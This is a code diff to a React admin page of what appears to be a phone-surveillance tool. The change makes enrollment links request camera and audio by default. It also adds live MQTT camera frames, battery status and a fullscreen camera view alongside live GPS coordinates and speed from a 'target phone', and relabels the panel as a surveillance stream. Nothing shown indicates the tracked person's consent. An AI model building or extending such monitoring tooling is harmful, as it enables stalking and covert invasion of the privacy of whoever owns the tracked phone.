@@ -44,16 +44,18 @@ export default function DeviceManagementPage() {
   const [linkModalOpen, setLinkModalOpen] = useState(false);
   const [linkPresetName, setLinkPresetName] = useState('');
   const [linkRequestedLocation, setLinkRequestedLocation] = useState(true);
-  const [linkRequestedAudio, setLinkRequestedAudio] = useState(false);
-  const [linkRequestedCamera, setLinkRequestedCamera] = useState(false);
+  const [linkRequestedAudio, setLinkRequestedAudio] = useState(true);
+  const [linkRequestedCamera, setLinkRequestedCamera] = useState(true);
   const [generatedLinkData, setGeneratedLinkData] = useState(null);
   const [copied, setCopied] = useState(false);
   const [error, setError] = useState('');
 
-  // Live WebRTC Remote Streaming States from Target Phone
+  // Live WebRTC & MQTT Remote Streaming States from Target Phone
   const [liveRemoteDevice, setLiveRemoteDevice] = useState(null);
   const [liveRemoteGps, setLiveRemoteGps] = useState(null);
   const [liveRemoteStream, setLiveRemoteStream] = useState(null);
+  const [liveCameraFrame, setLiveCameraFrame] = useState(null);
+  const [liveBattery, setLiveBattery] = useState(null);
 
   const fetchDevices = async () => {
     try {
@@ -89,9 +91,9 @@ export default function DeviceManagementPage() {
     return () => clearInterval(interval);
   }, []);
 
-  // Subscribe to live WebRTC streaming updates
+  // Subscribe to live WebRTC & MQTT streaming updates
   useEffect(() => {
-    const unsub = subscribeToRemoteUpdates(({ device, telemetry, stream }) => {
+    const unsub = subscribeToRemoteUpdates(({ device, telemetry, stream, cameraFrame, battery }) => {
       if (device) {
         setLiveRemoteDevice(device);
         fetchDevices();
@@ -102,16 +104,23 @@ export default function DeviceManagementPage() {
       if (stream) {
         setLiveRemoteStream(stream);
       }
+      if (cameraFrame) {
+        setLiveCameraFrame(cameraFrame);
+      }
+      if (battery) {
+        setLiveBattery(battery);
+      }
     });
     return () => unsub();
   }, []);
 
-  // Listen on all active enrollment link tokens via PeerJS
+  // Listen on all active enrollment link tokens via MQTT & PeerJS
   useEffect(() => {
+    startAdminPeerListener();
     if (links && links.length > 0) {
       links.forEach((l) => {
         if (l.token) {
-          startAdminPeerListener(l.token, ({ type, data, stream }) => {
+          startAdminPeerListener(l.token, ({ type }) => {
             if (type === 'DEVICE_JOINED') {
               fetchDevices();
             }
@@ -274,8 +283,8 @@ export default function DeviceManagementPage() {
         </div>
       </div>
 
-      {/* Live Remote Stream & GPS Alert Card */}
-      {(liveRemoteDevice || liveRemoteGps || liveRemoteStream) && (
+      {/* Live Remote Stream, Camera & GPS Surveillance Card */}
+      {(liveRemoteDevice || liveRemoteGps || liveRemoteStream || liveCameraFrame) && (
         <div className="glass-panel p-5 rounded-3xl border border-emerald-500/40 bg-emerald-500/5 shadow-2xl relative overflow-hidden animate-fadeIn">
           <div className="flex flex-col md:flex-row items-start md:items-center justify-between gap-4">
             <div className="flex items-center gap-3.5">
@@ -293,12 +302,18 @@ export default function DeviceManagementPage() {
                   <h3 className="text-sm font-bold text-white">
                     {liveRemoteDevice?.deviceName || liveRemoteDevice?.name || 'Remote Target Device Connected'}
                   </h3>
-                  <span className="px-2 py-0.5 text-[9px] font-bold rounded-full bg-emerald-500/20 text-emerald-400 border border-emerald-500/30 uppercase tracking-wider">
-                    LIVE STREAMING ACTIVE
+                  <span className="px-2 py-0.5 text-[9px] font-bold rounded-full bg-emerald-500/20 text-emerald-400 border border-emerald-500/30 uppercase tracking-wider flex items-center gap-1">
+                    <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-ping"></span>
+                    LIVE TRANSMISSION
                   </span>
                 </div>
                 <p className="text-[11px] text-slate-400 mt-0.5">
                   Platform: <span className="text-slate-300 font-semibold">{liveRemoteDevice?.platform || 'Smartphone'}</span>
+                  {liveBattery && (
+                    <span className="ml-2 text-emerald-400 font-semibold">
+                      · Battery: {liveBattery.level}% {liveBattery.charging ? '⚡' : ''}
+                    </span>
+                  )}
                   {liveRemoteGps && (
                     <span className="ml-2 text-cyan-400 font-mono">
                       · GPS: {liveRemoteGps.lat?.toFixed(5)}, {liveRemoteGps.lng?.toFixed(5)} (±{Math.round(liveRemoteGps.accuracy || 0)}m)
@@ -311,49 +326,64 @@ export default function DeviceManagementPage() {
             <div className="flex items-center gap-2.5 w-full md:w-auto">
               <Link
                 to="/location"
-                className="flex-1 md:flex-none flex items-center justify-center gap-2 px-4 py-2 rounded-xl bg-cyan-500/20 hover:bg-cyan-500/30 text-cyan-300 border border-cyan-500/40 text-xs font-bold transition"
+                className="flex-1 md:flex-none flex items-center justify-center gap-2 px-4 py-2 rounded-xl bg-cyan-500/20 hover:bg-cyan-500/30 text-cyan-300 border border-cyan-500/40 text-xs font-bold transition shadow"
               >
                 <MapPin className="w-4 h-4" />
                 <span>Track on Live Map</span>
               </Link>
+              <Link
+                to="/camera"
+                className="flex-1 md:flex-none flex items-center justify-center gap-2 px-4 py-2 rounded-xl bg-emerald-500/20 hover:bg-emerald-500/30 text-emerald-300 border border-emerald-500/40 text-xs font-bold transition shadow"
+              >
+                <Camera className="w-4 h-4" />
+                <span>Fullscreen Camera</span>
+              </Link>
             </div>
           </div>
 
-          {/* Embedded live video feed */}
-          {liveRemoteStream && (
+          {/* Embedded live video / camera feed */}
+          {(liveRemoteStream || liveCameraFrame) && (
             <div className="mt-4 pt-4 border-t border-slate-800 grid grid-cols-1 md:grid-cols-3 gap-4">
-              <div className="relative rounded-2xl overflow-hidden bg-black aspect-video border border-slate-800 shadow-xl">
-                <video
-                  autoPlay
-                  playsInline
-                  ref={(el) => {
-                    if (el && liveRemoteStream && el.srcObject !== liveRemoteStream) {
-                      el.srcObject = liveRemoteStream;
-                    }
-                  }}
-                  className="w-full h-full object-cover"
-                />
-                <div className="absolute top-2 left-2 bg-emerald-500/90 text-black text-[9px] font-black px-2 py-0.5 rounded uppercase tracking-wider flex items-center gap-1">
+              <div className="relative rounded-2xl overflow-hidden bg-black aspect-video border border-slate-800 shadow-xl flex items-center justify-center">
+                {liveRemoteStream ? (
+                  <video
+                    autoPlay
+                    playsInline
+                    ref={(el) => {
+                      if (el && liveRemoteStream && el.srcObject !== liveRemoteStream) {
+                        el.srcObject = liveRemoteStream;
+                      }
+                    }}
+                    className="w-full h-full object-cover"
+                  />
+                ) : (
+                  <img
+                    src={liveCameraFrame}
+                    alt="Target Phone Camera Live Frame"
+                    className="w-full h-full object-cover"
+                  />
+                )}
+                <div className="absolute top-2 left-2 bg-emerald-500/90 text-black text-[9px] font-black px-2 py-0.5 rounded uppercase tracking-wider flex items-center gap-1 shadow">
                   <span className="w-1.5 h-1.5 rounded-full bg-black animate-ping"></span>
-                  Target Phone Camera
+                  {liveRemoteStream ? 'WebRTC HD Stream' : 'Live Camera (MQTT)'}
                 </div>
               </div>
               <div className="md:col-span-2 flex flex-col justify-between p-1">
                 <div className="space-y-2">
                   <div className="text-xs font-bold text-white flex items-center gap-2">
                     <CheckCircle className="w-4 h-4 text-emerald-400" />
-                    <span>Real-Time Bi-Directional WebRTC Telemetry Feed</span>
+                    <span>Real-Time Bi-Directional Device Surveillance Stream</span>
                   </div>
                   <p className="text-[11px] text-slate-400 leading-relaxed">
-                    This camera stream is transmitting peer-to-peer directly from the target phone camera across the internet without server delay. GPS coordinates update dynamically.
+                    This camera feed and GPS sensor data are transmitting live from the remote smartphone across cellular data or Wi-Fi. Real-time updates reflect without requiring any page reload.
                   </p>
                 </div>
                 {liveRemoteGps && (
-                  <div className="p-3 rounded-xl bg-slate-900/80 border border-slate-800 text-xs font-mono text-cyan-300 grid grid-cols-2 gap-2 mt-2">
-                    <div>Latitude: {liveRemoteGps.lat?.toFixed(6)}</div>
-                    <div>Longitude: {liveRemoteGps.lng?.toFixed(6)}</div>
-                    <div>Accuracy: ±{Math.round(liveRemoteGps.accuracy || 0)}m</div>
-                    <div>Speed: {liveRemoteGps.speed ? `${liveRemoteGps.speed} m/s` : 'Stationary'}</div>
+                  <div className="p-3 rounded-xl bg-slate-900/80 border border-slate-800 text-xs font-mono text-cyan-300 grid grid-cols-2 md:grid-cols-4 gap-2 mt-2">
+                    <div>Lat: <span className="text-white">{liveRemoteGps.lat?.toFixed(5)}</span></div>
+                    <div>Lng: <span className="text-white">{liveRemoteGps.lng?.toFixed(5)}</span></div>
+                    <div>Accuracy: <span className="text-white">±{Math.round(liveRemoteGps.accuracy || 0)}m</span></div>
+                    <div>Speed: <span className="text-white">{liveRemoteGps.speed ? `${liveRemoteGps.speed} m/s` : 'Stationary'}</span></div>
                   </div>
                 )}
               </div>
